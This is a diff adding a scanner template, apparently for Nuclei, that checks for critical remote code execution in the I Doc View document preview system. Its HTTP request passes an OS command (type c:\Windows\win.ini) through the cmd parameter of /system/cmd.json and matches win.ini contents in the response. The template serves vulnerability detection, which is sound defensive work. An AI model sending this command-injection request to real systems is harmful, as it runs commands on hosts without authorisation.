@@ -1,0 +1,26 @@
+id: i-doc-view-odps-cmd-rce
+info:
+  name: I Doc View Online Document Preview System CMD Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        GET /system/cmd.json?cmd=type+c:\\Windows\\win.ini HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "[files]"
+          - "data"
+      - type: word
+        part: header
+        words:
+          - "application/json"
